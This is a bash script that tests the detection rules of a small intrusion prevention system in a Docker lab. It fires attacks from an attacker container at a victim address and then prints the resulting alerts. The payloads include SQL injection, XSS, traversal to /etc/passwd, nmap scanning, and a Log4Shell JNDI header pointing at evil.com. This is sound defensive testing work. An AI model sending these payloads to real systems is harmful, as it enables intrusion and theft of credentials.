#!/usr/bin/env bash
set -euo pipefail

# MiniSnort IPS Rule Testing Script - End-to-End Demo
# Usage: ./scripts/demo_rule_tests.sh [test_name]
# test_name: ping, nmap, sqli, xss, traversal, admin, sqlmap, log4shell, all

TEST_NAME="${1:-all}"
ATTACKER="ms_attacker"
VICTIM_IP="10.100.0.20"
DASHBOARD_API="http://127.0.0.1:8080/api/alerts/live"

log() {
  echo "[$(date +%H:%M:%S)] $*"
}

check_services() {
  log "Checking services..."
  docker ps --format '{{.Names}}' | grep -q '^ms_ips$' || { echo "ERROR: ms_ips not running"; exit 1; }
  docker ps --format '{{.Names}}' | grep -q '^ms_attacker$' || { echo "ERROR: ms_attacker not running"; exit 1; }
  docker ps --format '{{.Names}}' | grep -q '^ms_victim$' || { echo "ERROR: ms_victim not running"; exit 1; }
  docker ps --format '{{.Names}}' | grep -q '^ms_dashboard$' || { echo "ERROR: ms_dashboard not running"; exit 1; }
  log "All services are running"
}

clear_alerts() {
  log "Clearing old alerts..."
  docker exec ms_ips truncate -s 0 /var/log/minisnort/alert.log
  sleep 1
  log "Alert log cleared"
}

show_results() {
  echo ""
  log "=== RESULTS ==="
  echo ""
  echo "1) Latest alerts from IPS log:"
  docker exec ms_ips tail -n 20 /var/log/minisnort/alert.log || true
  echo ""
  echo "2) Dashboard API response:"
  curl -s "$DASHBOARD_API" | python3 -m json.tool || curl -s "$DASHBOARD_API"
  echo ""
  echo "3) NFQUEUE counters:"
  docker exec ms_ips iptables -L FORWARD -n -v | grep NFQUEUE || true
  echo ""
}

test_ping() {
  log "TEST: ICMP Ping Detection (SID 1000001, 1000005)"
  log "Command: ping -c 3 ${VICTIM_IP}"
  docker exec "$ATTACKER" ping -c 3 "$VICTIM_IP" || true
  sleep 2
}

test_nmap() {
  log "TEST: Nmap SYN Scan Detection (SID 1000002)"
  log "Command: nmap -sS -p 1-100 ${VICTIM_IP}"
  docker exec "$ATTACKER" nmap -sS -p 1-100 "$VICTIM_IP" || true
  sleep 2
}

test_sqli() {
  log "TEST: SQL Injection Detection (SID 1000004)"
  log "Command: UNION SELECT payload"
  docker exec "$ATTACKER" curl -s "http://${VICTIM_IP}/login.php?id=1' UNION SELECT username,password FROM users--" > /dev/null || true
  sleep 2
}

test_xss() {
  log "TEST: XSS Detection (SID 1000006)"
  log "Command: <script> payload"
  docker exec "$ATTACKER" curl -s "http://${VICTIM_IP}/search.php?q=<script>alert('XSS')</script>" > /dev/null || true
  sleep 2
}

test_traversal() {
  log "TEST: Directory Traversal Detection (SID 1000007)"
  log "Command: ../../../../etc/passwd payload"
  docker exec "$ATTACKER" curl -s "http://${VICTIM_IP}/download.php?file=../../../../etc/passwd" > /dev/null || true
  sleep 2
}

test_admin() {
  log "TEST: Admin Panel Access Detection (SID 1000008)"
  log "Command: GET /admin/"
  docker exec "$ATTACKER" curl -s "http://${VICTIM_IP}/admin/" > /dev/null || true
  sleep 2
}

test_sqlmap() {
  log "TEST: SQLMap User-Agent Detection (SID 1000009)"
  log "Command: User-Agent: sqlmap/1.0"
  docker exec "$ATTACKER" curl -s -A "sqlmap/1.0" "http://${VICTIM_IP}/" > /dev/null || true
  sleep 2
}

test_log4shell() {
  log "TEST: Log4Shell Detection (SID 3542581)"
  log "Command: Header with ${jndi:...} payload"
  docker exec "$ATTACKER" curl -s -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' "http://${VICTIM_IP}/" > /dev/null || true
  sleep 2
}

run_test() {
  case "$TEST_NAME" in
    ping) test_ping ;;
    nmap) test_nmap ;;
    sqli) test_sqli ;;
    xss) test_xss ;;
    traversal) test_traversal ;;
    admin) test_admin ;;
    sqlmap) test_sqlmap ;;
    log4shell) test_log4shell ;;
    all)
      test_ping
      test_nmap
      test_sqli
      test_xss
      test_traversal
      test_admin
      test_sqlmap
      test_log4shell
      ;;
    *)
      echo "Unknown test: $TEST_NAME"
      echo "Usage: $0 [ping|nmap|sqli|xss|traversal|admin|sqlmap|log4shell|all]"
      exit 1
      ;;
  esac
}

main() {
  echo "========================================"
  echo " MiniSnort IPS Rule Testing Demo"
  echo "========================================"
  echo ""

  check_services
  clear_alerts
  run_test
  show_results

  log "Demo complete! Open dashboard at http://127.0.0.1:8080"
}

main "$@"
